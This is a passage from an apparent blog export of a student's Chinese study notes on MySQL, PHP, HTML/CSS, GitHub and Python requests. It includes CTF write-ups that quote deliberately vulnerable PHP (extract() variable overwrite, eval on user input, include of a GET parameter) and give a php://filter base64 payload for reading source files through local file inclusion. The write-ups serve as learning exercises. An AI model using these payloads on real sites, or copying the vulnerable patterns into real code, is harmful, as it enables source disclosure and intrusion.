fl4g#get flag!!!]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql基础]]></title>
    <url>%2F2018%2F10%2F03%2Fmysql%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[概念数据库：文件夹data里面的一个个文件夹就是一个个数据库 数据表：数据库中的表，用于存放数据信息MySQL：操作数据库（表）的一种语言 准备1.安装phpstudy2.。。。 进入到数据库打开PHPstudy-进入其他选项菜单-MySQL工具-打开数据库目录 进到了MySQL-data这个目录，里面有四个文件夹，即有四个数据库 MySQL语句规则1.每条语句以分号结尾； 2.关键词不区分大小写； 3.注释 #我是注释 -- 我是注释 /* 多行注释 */数据库显示所有数据库show databases; 注：其中information_schema意思为‘信息共计’，不是一个数据库 与data里的文件夹一样 使用（进入）数据库use 数据库名;例如，进入‘test’数据库 会显示‘Database changed’，表明已经进入此数据库 创建数据库create database 数据库名;创建一个名为‘hello’的数据库名 在data中即可找到‘hello’ 删除数据库drop database 数据库名;删除数据库‘hello’ 在data中就没有这个数据库了 数据表创建数据表mysql&gt; use test; mysql&gt; create table hello( -&gt; id int unsigned not null auto_increment, -&gt; email varchar(20) not null, -&gt; age tinyint unsigned not null, -&gt; primary key(id) -&gt; );注： 1.创建前，应指明在哪创建，切换到目的目录 2.使用‘create table 数据表名’创建，并且在创建的同时要设定表内的信息 3.表内信息位于表明后的括号内，每条信息以‘,’换行隔开 4.格式：列字段名 数据类型 修饰语句 not null 5.最后要加上primary key（主键）auto_increment必须制定为primary key;将id设为primary key : primary key(id)查看当前数据库的表show tables;注：先切换到指定数据库 use 数据库名;查看表结构desc 表名;查看创建表的sql语句show create table 表名;删除表drop table 表名;修改表修改数据类型alter table 表名 modify 字段名 数据类型;修改字段名alter table 表名 change 原名 新名;插入数据insert into 表名(字段名1，字段名2...) values (值1，值2...);修改（更新）数据update 表名 set 字段名1=新值，字段名2=新值;可使用where子句指定更改的row 删除数据delete from 表名 where...;如果没有指定where子句，则会删除表中所有数据 DQL(数据查询语言)获取某列值：select 列名1,列名2... from 表名;获取表所有值：select * from 表名;where子句读取指定的数据 MySQL 的 WHERE 子句的字符串比较是不区分大小写的。可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的。 如‘hello’表中数据为： 若要查询age为20的信息： 除了上面使用‘=’这个操作符，还有以下操作符： like子句LIKE 子句中使用百分号 %字符来表示任意字符，类似于正则表达式中的星号 *。 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。 如，获取email字段以‘COM’结尾的记录： select * from hello where email like &apos;%com&apos;; unionUNION 语句：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据） UNION ALL 语句：用于将不同表中相同列中查询的数据展示出来；（包括重复数据） 使用形式如下： SELECT 列名称 FROM 表名称 UNION SELECT 列名称 FROM 表名称 ORDER BY 列名称； SELECT 列名称 FROM 表名称 UNION ALL SELECT 列名称 FROM 表名称 ORDER BY 列名称；注：使用union查询时，查询的列要与select查询的列相同 limitselect * from table limit m,n其中m是指记录开始的index，从0开始，表示第一条记录n是指从第m+1条开始，取n条。 select * from tablename limit 2,4 即取出第3条至第6条，4条记录unique与primary每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束 primary key 主键：主键必须包含唯一的值，不能包含NULL值 unique key 约束: 必须是唯一的值，可以包含NULL值 设置unique： alter table user add unique(username);]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP数组]]></title>
    <url>%2F2018%2F10%2F03%2FPHP%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[暑假学的没怎么懂，今天做题时仔细想了一下关于使用PHP中数组的知识，总算大悟，还是动手敲一下代码懂得快！ php中代码为 开始测试： 1.输入地址为 http://127.0.0.1/?username=[1]页面显示为 说明以‘参数名’=‘参数’的方式，即使参数是数组类型的，但是&amp;_GET[‘username’]接收的仍是字符串类型 即 $_GET[&apos;username&apos;] === &apos;[1]&apos;2.输入地址为 http://127.0.0.1/?username[]页面显示为 意思为： 数组中的键‘username’对应的值为一个数组，这个数组键为默认的‘0’，值为空字符串即 $_GET[&apos;username&apos;] === [&apos;&apos;]3.输入地址为 127.0.0.1/?username[]=1页面显示为 则 $_GET[&apos;username&apos;] === [&apos;1&apos;]sum给参数传递的值为数组需要用‘参数名[]’的形式 12345&lt;?php$a = $_GET['t'];var_dump($a); 1.传递数组参数时指定下标： ?t[a]=1页面显示： array(1) { [&quot;a&quot;]=&gt; string(1) &quot;1&quot; }2.传递多个数组参数： ?t[]=1&amp;t[]=2页面显示： array(2) { [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(1) &quot;2&quot; }]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-extract变量覆盖]]></title>
    <url>%2F2018%2F10%2F02%2FBugku-extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2F</url>
    <content type="text"><![CDATA[p:彻底弄懂之后，发现网上找的答案有好多说法不对，唉，还是得靠自己 先看题目代码 &lt;?php $flag=&apos;xxx&apos;; extract($_GET); if(isset($shiyan)) { $content=trim(file_get_contents($flag)); if($shiyan==$content) { echo&apos;flag{xxx}&apos;; } else { echo&apos;Oh.no&apos;; } } ?&gt;题目信息： 1.extract() 函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。 针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。 可能的值： EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 在本题中，因为有if判断，所以要构造‘shiyan’参数，使用extract($_GET)意思即为： $shiyan = 参数 2.trim() 函数移除字符串两侧的空白字符或其他预定义字符。 可选参数；规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： &quot;\0&quot; - NULL &quot;\t&quot; - 制表符 &quot;\n&quot; - 换行 &quot;\x0B&quot; - 垂直制表符 &quot;\r&quot; - 回车 &quot; &quot; - 空格 3.file_get_contents() 函数把整个文件读入一个字符串中。则： 1.当‘shiyan’没有值的时候，即‘shiyan=&apos;&apos;’；trim(file_get_contents($flag))也为&apos;&apos;; 因此两个空字符串比较会返回1，即会输出flag，因此可在网址后添加参数 ?shiyan 即可输出flag注： file_get_contents()传入的文件为‘$flag’变量时,会报错并返回bool(flase);加上trim后，trim(file_get_contents($flag))的返回值为空字符串&apos;&apos;，因此参数不用带任何值]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTML布局+CSS]]></title>
    <url>%2F2018%2F09%2F27%2FHTML%E5%B8%83%E5%B1%80-CSS%2F</url>
    <content type="text"><![CDATA[css注释： /*css没有单行注释符*/ &lt; div &gt;&lt; div &gt; 可定义文档中的分区或节（division/section）。 &lt; div &gt; 标签可以把文档分割为独立的、不同的部分。 &lt; div &gt; 是一个块级元素。这意味着它的内容自动地开始一个新行。实际上，换行是 &lt; div &gt; 固有的唯一格式表现。可以通过 &lt; div &gt; 的 class 或 id 应用额外的样式。 body中： &lt;div id=&apos;a&apos;&gt; hello gtf &lt;/div&gt;则在head中的style可以设置： #a { height: 400px; background-color: grey; }注： div默认占一块 不设置宽度则会占满一（多）行要使两个div内容在一行，则需要 浮动 #a { height: 400px; background-color: grey; float:left } #b { height: 400px; background-color: red; float:left }idid 属性规定 HTML 元素的唯一的 id。 id 在 HTML 文档中必须是唯一的。 id 属性可用作链接锚（link anchor），通过 JavaScript（HTML DOM）或通过 CSS 为带有指定 id 的元素改变或添加样式。 语法： &lt;element id=&quot;value&quot;&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-域名解析]]></title>
    <url>%2F2018%2F09%2F24%2FBugku-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[题目描述 相关概念 域名解析： 域名解析是将域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。 IP地址是网络上标识站点的数字地址，为方便记忆，采用域名来代替IP地址标识站点地址。 域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。hosts文件： Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”， 当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到， 则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。 需要注意的是，Hosts文件配置的映射是静态的，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问。解题过程： windows下修改的文件为： c:\windows\system32\drivers\etc\hosts 参考 https://www.cnblogs.com/lxz-1263030049/p/9298532.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-变量1]]></title>
    <url>%2F2018%2F09%2F16%2FBugku-%E5%8F%98%E9%87%8F1%2F</url>
    <content type="text"><![CDATA[题目如下： 提取信息： 1.关闭了1报错提示 2.包含flag1.php文件 3.get方法传入args参数，且其值符合正则表达式‘/^\w+$/’ 4.满足后，运行eval(&quot;var_dump($$args);&quot;)相关知识： 1.PHP正则表达式 表达式格式： /表达式/[修正符] $ :表示行尾 ^ :表示行开始 \w :匹配一个英文字母，数字或下划线 + :匹配一次或多次 2.可变变量 某变量的名称由另一个变量的值来确定 如： &lt;?php $a =&apos;b&apos;; $b = 123; echo $$a; ?&gt;会输出 1233.$GLOBALS 存储了所有的全局变量的数组 有了以上的知识，根据提示‘flag在变量中’，即可在浏览器url后添加参数 args=GLOBALS即可 原来$GLOBALS还能获得include里的文件内的变量！]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF常用的PHP知识]]></title>
    <url>%2F2018%2F09%2F16%2FCTF%E5%B8%B8%E7%94%A8%E7%9A%84PHP%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[ctf中的常用PHP知识点 $-GET在 PHP 中，预定义的 $_GET 变量用于收集来自 method=”get” 的表单中的值。 is_numeric()函数用于检测变量是否为数字或数字字符串。 isset()isset()用于检测变量是否设置。 var_dump()var_dump()方法是判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型.此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 var_dump里面的变量必须是存在的,如果变量存在但值是空的就会返回false;没有变量则返回NULL.他自己就有输出的功能。不必加其他的输出函数。 ereg()ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 strpos()strpos() 函数用于在字符串内查找一个字符或一段指定的文本。 如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。 die()die() 函数输出一条消息，并退出当前脚本。 该函数是 exit() 函数的别名。 语法 die(status)status 必需。规定在退出脚本之前写入的消息或状态号。状态号不会被写入输出。 如果 status 是字符串，则该函数会在退出前输出字符串。 如果 status 是整数，这个值会被用作退出状态。退出状态的值在 0 至 254 之间。退出状态 255 由 PHP 保留，不会被使用。状态 0 用于成功地终止程序。 md5()函数计算字符串的 MD5 散列。 eval()将字符串当做PHP代码执行，其中字符串要以 ； 结尾，且其语句要符合PHP语法 如： &lt;?php $a = &apos;echo &quot;100&quot;.&quot;haha&quot;;&apos;; eval($a); ?&gt;运行结果： 100hahagzinflate(base64_decode())经过base64和gzinflate加密 LFI文件包含漏洞：通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入 PHP有include和require语句，可以将其他文件引入到当前文件并执行（其他文件可为其他类型，与文件后缀无关，如包含‘1.txt’文件时，会将其中的代码当做PHP运行） include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的： 当引入的文件中有错误时： require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。 include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。error_reporting()规定不同的错误报告级别；error_reporting(0)为关闭错误报告 例如，/test/包含.php 文件内容： &lt;?php error_reporting(0); if($_GET[&apos;file&apos;]) include $_GET[&apos;file&apos;] ?&gt;在浏览器输入url http://127.0.0.1/test/包含.php?file=send.php即使不存在这个文件也不会报错，页面将显示空白 将 error_reporting(0) 注释掉后，页面正常显示错误 show_source()本函数通过使用 PHP 语法高亮程序中定义的颜色，输出或返回包含在 filename 中的代码的语法高亮版本。 highlight_file()同上 FILEFILE返回文件所在的绝对路径且有文件自身的名字在内 echo __FILE__ #返回当前文件路径及自身文件名 show_source(__FILE__) #使当前文件代码高亮并输出$_REQUEST[]用于接收表单数据，具有$_POST[]与$_GET[]功能 @PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉 字符串函数参考链接 http://www.w3school.com.cn/php/php_ref_string.aspstristr()函数搜索字符串在另一字符串中的第一次出现，并返回字符串的剩余部分： stristr(string,search,before_search) string 必需；规定被搜索的字符串。 search 必需；规定要搜索的字符串。 如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。 before_search 可选；默认值为 &quot;false&quot; 的布尔值。 如果设置为 &quot;true&quot;，它将返回 search 参数第一次出现之前的字符串部分。该函数对大小写不敏感 strstr()函数搜索字符串在另一字符串中的第一次出现，并返回字符串的剩余部分 该函数对大小写敏感 preg_match()用于进行正则表达式匹配，成功返回1，否则返回0 正则表达式详解参考： https://www.cnblogs.com/hellohell/p/5718319.html https://www.cnblogs.com/yafei236/p/4168290.htmlfile_get_contents()函数把整个文件读入一个字符串中 trim()函数移除字符串两侧的空白字符或其他预定义字符 格式： trim(string,charlist)参数： string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： &quot;\0&quot; - NULL &quot;\t&quot; - 制表符 &quot;\n&quot; - 换行 &quot;\x0B&quot; - 垂直制表符 &quot;\r&quot; - 回车 &quot; &quot; - 空格extract()函数从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。 $_SERVER[“REQUEST_URI”]获得当前url的路径地址 substr()返回字符串的提取部分 str_replace()返回替换后的字符串 str_replace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。parse_str()函数把查询字符串解析到变量中。 如： &lt;?php parse_str(&apos;str=123&apos;); echo $str; ?&gt;则会输出 123]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-点击一百万次]]></title>
    <url>%2F2018%2F09%2F14%2FBugku-%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1%2F</url>
    <content type="text"><![CDATA[哇哈哈哈总算用自己的想法做出了一道题（虽然耗了我两天。。。） hint(提示):JavaScript 直接看源代码 意思就是当点击一百万次的时候，就会提交一个表单，就估计会返回flag的值 那自己提交，观察到表单中提交的值为clicks，提交的方式为post，就可以用在线http网址测试、写python脚本、插件等构造post请求 但，我受到前面的题的影响（修改html输入框长度获得flag），直接修改js部分代码不就行了 结果，修改了不起作用，并且网页一刷新啥都复原了 那么为什么不能直接更改js代码来获取flag呢？ 后来知道： js在运行前就被加载到内存里，虽然修改了js代码，但要让新代码重新生效要刷新浏览器，但是只要一刷新页面，JS的代码内容是会重新从cache获取或者重新向服务器请求然后执行的但可以用js的调试工具‘console’控制台重新定义函数 按下回车后，修改后的js代码就生效了 点击小球，获取flag]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-你必须让它停下]]></title>
    <url>%2F2018%2F09%2F11%2FBugku-%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E5%AE%83%E5%81%9C%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[打开网址是这样滴 是一个不断刷新的网页，但有时候会显示图片 于是我断定，这张图片中就隐藏着flag！于是我快准狠的点击将这张图片下载下来，然额，改了图片后缀并没有发现什么。。。 查看网页源码 第19行有个‘flag is here’引起了我的注意，但思前想后，flag在哪呢？ 还有一个地方引起了我注意，就是img src后的图片名是随机的，在网页右键选择‘检查’即可发现，而且到‘10.jpg’的时候，网页会显示图片 既然不行，就抓包 在repeater中，不断的点击‘go’，到‘10.jpg’的时候，出现了flag flag原来藏在响应体里面！]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web基础$_post]]></title>
    <url>%2F2018%2F09%2F11%2FBugku-web%E5%9F%BA%E7%A1%80-post%2F</url>
    <content type="text"><![CDATA[今天做这道挺简单的题竟然没有思路，上网搜了一下才发现我竟然把暑假学过的爬虫给忘了！！！自罚刷题。。。 题目： $what=$_POST[&apos;what&apos;]; echo $what; if($what==&apos;flag&apos;) echo &apos;flag{****}&apos;;就是构造参数，用post的方法提交 写个爬虫脚本就行了。。。 import requests url = &apos;http://120.24.86.145:8002/post/&apos; data = {&apos;what&apos;: &apos;flag&apos;} req = requests.post(url, data) print(req.text)即可得到flag： flagflag{bugku_get_ssseint67se}还有其他的方法，比如用火狐浏览器下载‘hackbar’，好像是这个（表示已经用Chrome了，谁用谁说好~） 还有就是用在线HTTP接口测试 http://www.atool.org/httptest.php 可以很方便的构造post请求（注：链接后要加一个 /，构造GET请求时，参数部分 ? 前也要添加一个 /） 即可在Response Body里看到响应内容]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF-文件包含writeup]]></title>
    <url>%2F2018%2F09%2F08%2F%E5%8D%97%E9%82%AECTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABwriteup%2F</url>
    <content type="text"><![CDATA[学了一天PHP，弄懂了很多之前学的模糊的知识~ writeup题目提示：LFI 点击后 先看服务器中的index.php文件中的代码： &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;} $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?&gt; &lt;/html&gt;可以看出： 1.关闭了报错提示 2.flag被注释掉了，不能显示到网页 3.如果不存在file参数，显示‘click me? no’；如果存在file参数，且其值中有‘../ 、tp 、input 、data’时显示‘Oh no!’并退出脚本 其他情况为打开file后的参数名文件（文件不存在且关闭了报错提示，则网页显示空白）那么如何才能获得PHP源码呢？做法很简单，只需要将PHP代码编码即可 为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍这里就会用到php://filter，php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流 使用 php://filter/read=convert.base64-encode/resource=./xxe.php即可将PHP中的代码进行base64编码 将代码复制解码，即能看到flag信息 &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;} $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?&gt; &lt;/html&gt;文件包含漏洞总结参考链接 https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487364&amp;idx=1&amp;sn=28c137a2b75f1b59256741d6c8686fbd&amp;chksm=ec1e3facdb69b6ba3e6fd0593de30a57d3c8684fc3c64d2ecf12d5040e393749d5cf720dca91&amp;scene=21#wechat_redirect]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP基础]]></title>
    <url>%2F2018%2F09%2F07%2FPHP%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[准备下载安装XAMPP 参考 https://study.163.com/course/courseMain.htm?courseId=1004572025点击前两个Module的start 之后在浏览器输入‘127.0.0.1’（127.0.0.1是回送地址，指本地机，一般用来测试使用）。出现 编写PHP文件文件存放位置找到安装的xampp文件夹中的htdocs文件夹，里面存放的文件即上图输入127.0.0.1后出现的页面 将‘index.php’文件删除（网站默认打开网站的首页），添加新文件‘test.php’ 刷新，可看到 PHP与HTML的混写PHP的代码在‘’之间，可以加入HTML混写；在此范围外的代码为html 运行结果 查看网页源代码 若文件内容是纯PHP文件，则最好在文件末尾删除PHP结束标记 ?&gt; ,这可以避免在 PHP 结束标记之后万一意外加入了空格或者换行符，会导致 PHP 开始输出这些空白，而脚本中此时并无输出的意图。 则发现： 写的PHP代码文件在服务端解析，成为HTML文件，再发送给客户端语法hello world&lt;?php echo &apos;hello world&apos;; ?&gt; //这是注释 #这也是注释 /*多行 注释 */1.以标记 结束2.echo为输出语句，能够输出一个以上的字符串；echo有无括号均可使用3.‘；’，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。 若将上述代码改为 在浏览器发现报错，错误出现在第四行 这是因为第二行没有‘；’结束指令，一直到第四行才检测到第二行的echo语句并不是代码最后一行 变量变量由 $ 与其后的变量名组成，不用声明，直接赋值，区分大小写 赋值方式变量有两种赋值方式，默认为传值赋值，即将一个变量的值赋值给另一个变量，改变其中一个变量的值，不会影响到另一个变量的值； 还有一种为引用赋值，改动新变量将影响到原始变量；引用时，将 &amp; 加到需引用的变量前 &lt;?php $a = 1; $b = &amp;$a; $b = 2; echo $a; ?&gt;输出结果为 2可变变量 global与$GLOBALSglobal可以定义全局变量 注意：在函数体外定义的global变量不能在函数体内使用 &lt;?php $a=1; function hanshu() { global $a; $a += 1; } hanshu(); echo $a; ?&gt; #输出2PHP 同时在名为 $GLOBALS[index] 的数组中存储了所有的全局变量。下标存有变量名。这个数组在函数内也可以访问，并能够用于直接更新全局变量。 &lt;?php $b = 2; $a=0; function hanshu() { $GLOBALS[&apos;a&apos;]=$GLOBALS[&apos;b&apos;]+1; } hanshu(); echo $a; ?&gt;数据类型布尔类型TRUE及FLASE 可以使用bool()或boolean()来将一个值强制转换为布尔类型 字符类型单引号或双引号括起来的 输出的区别 单引号不会考虑字符串是否包含变量 双引号中如果包含变量，则会将变量替换为变量的值数组定义一个数组 $array = array(&apos;foo&apos; =&gt; &apos;bar&apos;)或（推荐使用） $array = [&apos;foo&apos; =&gt; &apos;bar&apos;]可以将数组定义为索引数组、关联数组 上述代码为关联数组，键的名是明确的 索引数组： $a = [1,2,3]在PHP文件中 &lt;?php $a = [&apos;q&apos; =&gt; 1,2,3]; var_dump($a) ?&gt;在浏览器运行显示： array(3) { [&quot;q&quot;]=&gt; int(1) [0]=&gt; int(2) [1]=&gt; int(3) }表示： 1.有三个元素 2.键‘q’对应整型的‘1’；值‘2’‘3’没有键，则键名默认从零开始键的名是从0开始（下标） 数组操作$a = [1,2,3] #增加 $a[3] = 4 #更改 $a[0] = &apos;1&apos; #删除 unset($a[0]) #输出值 echo $a[0]键的名称重复是，后面的会覆盖前面的 NULL表示一个变量没有值，NULL类型唯一的值就是不区分大小写的NULL 在下列情况下一个变量被认为是 NULL： 被赋值为 NULL。 尚未被赋值。 被 unset()。 （销毁变量）数据类型函数var_dump()可以查看某个表达式的值和类型 gettype()获取表达式的类型 is_type()验证某个类型，如is_int($a)验证变量a是否为整型 运算符.使用 . 可以拼接字符串、变量与字符串、变量与变量 ==比较数字与字符串时会将字符串转化为数值再进行比较 ===比较类型以及值是否相等 and或&amp;&amp;与 or或||或 数据接收与发送新建一个sent.php文件和一个get.php文件 send.php： &lt; DOCTYPE html &gt; &lt; html &gt; &lt; head &gt; &lt; title &gt; hello &lt; /title &gt; &lt; /head &gt; &lt; body &gt; &lt; form action=&apos;get.php&apos;, method=&apos;post&apos; &gt; &lt; input type=&apos;text&apos;, name=&apos;a&apos; &gt; &lt; input type=&apos;text&apos;, name=&apos;b&apos; &gt; &lt; input type=&apos;submit&apos;, value=&apos;确定&apos; &gt; &lt; /form &gt; &lt; /body &gt; &lt; /html &gt;get.php: &lt;?php var_dump($_POST[&apos;a&apos;]); var_dump($_POST[&apos;b&apos;]); ?&gt;在send.php中，创建了form表单用来向服务器提交数据，定义了两个文本框和一个提交按钮，点提交时，数据将被提交到from表单action定义的PHP文件，提交的方法为post；将两个文本框分别命名为a和b，以便用来接收内容 在get.php中，使用$_POST用来接收客户端发送来的数据，接收a和b的数据；直接使用‘$_POST’接收的数据类型为数组类型,使用$_POST[‘a’]得到数组的键‘a’对应的值，为字符串类型 在浏览器打开send.php文件，两个文本框分别输入111和222，然后点击确定 会被跳转到 可以看到，刚刚提交的数据显示到了页面上，url显示get.php文件 把send.php中的提交方法post改为get，get.php中的接收函数$_POST改为$_GET,再次提交 发现提交的数据依旧显示到了页面上，不过发现url的get.php后，多出来 ?a=111&amp;b=222这些内容，发现： 使用get提交的数据会显示在url中，而使用post提交的数据不会显示在url中]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Github使用学习]]></title>
    <url>%2F2018%2F08%2F26%2FGitHub%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[学习github的功能 仓库操作在github创建仓库进入到github，点击‘New respository’ 填好仓库名、描述、设为公有仓库或私有仓库后，点击创建 在Github删除仓库选择要删除的仓库，点击‘settings’ 拉到最下方，点击‘delete’ 输入这个仓库名即可删除这个仓库啦！ 文件操作查看提交日志推送到Github上后，在推送到的仓库内点击‘commit’即可查看历史提交记录 在仓库中创建文件点击‘create new file’创建 之后填写文件名、文件内容、提交说明、添加文件详细的说明 填好后点击‘commite new file’即可添加成功 在仓库主页，可以看到刚刚创建的‘test.py’文件，以及刚刚提交的说明； 查看文件改动信息、查看文件内容、删除文件查看文件改动信息：点击提交说明，即可查看文件的改动信息 查看文件内容：点击文件的名称，即可查看与编辑此文件 在文件内容页面的右方，点击笔状按钮可以编辑文件内容；点击垃圾桶按钮可以删除文件 修改、删除文件后仍可通过仓库主页‘commite’按钮查看此文件的信息 上传文件在仓库主页点击‘Upload files’ 之后拖动文件到此区域或点击‘choose your files’选择文件 待文件加载完，即可添加信息提交 查找文件在仓库主页点击‘find files’（或按快捷键‘t’） 之后在仓库名后的空白处输入需查找的文件名，下方就出现了含有此名称的文件 下载仓库文件在仓库主页点击‘clone or download’，再点击‘Download ZIP’，即可将仓库所有文件以zip格式下载到本地 issues发现别人的仓库文件存在bug、自己有疑问、想要与原开发者讨论交流等等，可以创建一个issues star收藏仓库；点击仓库，点击右上角star即可收藏 之后在右上角头像，点击‘your stars’可查看自己的收藏 watch关注仓库；关注后，当你所关注的仓库有新的commit，即可在自己的github主页看到该动态 fork克隆仓库；选择一个仓库，然后点‘fork’，则自己就会有一个一模一样的仓库在自己github上，且fork后的仓库是独立的，即自己修改fork的文件后，原文件不会有任何影响 pull Request自己修改了fork的文件，若想更新到原来的仓库，这时候要新建一个pull request；原来仓库的开发者看到这个请求，审核通过后即可选择合并 github搭建网页新建一个仓库，命名为‘你的github名.github.io’ 新建一个‘index.html’文件（相当于主页面，可以添加其他附带的html和css、js等文件） 写好文件后，访问这个仓库名即可访问该网页]]></content>
      <categories>
        <category>Github</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Cookie and Session]]></title>
    <url>%2F2018%2F08%2F17%2FCookie-and-Session%2F</url>
    <content type="text"><![CDATA[https://www.cnblogs.com/andy-zhou/p/5360107.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[requests的使用]]></title>
    <url>%2F2018%2F08%2F16%2Frequests%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[requests GET请求import requests r = requests.get(&apos;http://www.baidu.com&apos;) print(r.status_code) print(r.text)上面代码实现了get请求，输出了状态码和响应的内容 构造请求链接：利用params参数 import requests data = { &apos;name&apos;: &apos;germey&apos;, &apos;age&apos;: &apos;22&apos; } r = requests.get(&apos;http://httpbin.org/get&apos;, params=data) print(r.text) #结果 { &quot;args&quot;: { &quot;age&quot;: &quot;22&quot;, &quot;name&quot;: &quot;germey&quot; }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.18.4&quot; }, &quot;origin&quot;: &quot;171.9.47.36&quot;, &quot;url&quot;: &quot;http://httpbin.org/get?name=germey&amp;age=22&quot; }用text方法，网页返回的类型是str类型，是JSON格式的，要得到一个字典类型，可调用json()方法 r = r.json()抓取二进制数据 r.content #返回bytes类型的数据添加headers：利用headers参数 import requests headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0&apos; } r = requests.get(&apos;https://www.zhihu.com/explore&apos;, headers=headers) print(r.text)POST请求import requests data = {&apos;name&apos;: &apos;gtf&apos;, &apos;age&apos;: 12} r = requests.post(&apos;http://httpbin.org/post&apos;, data) print(r.text) #结果 { &quot;args&quot;: {}, 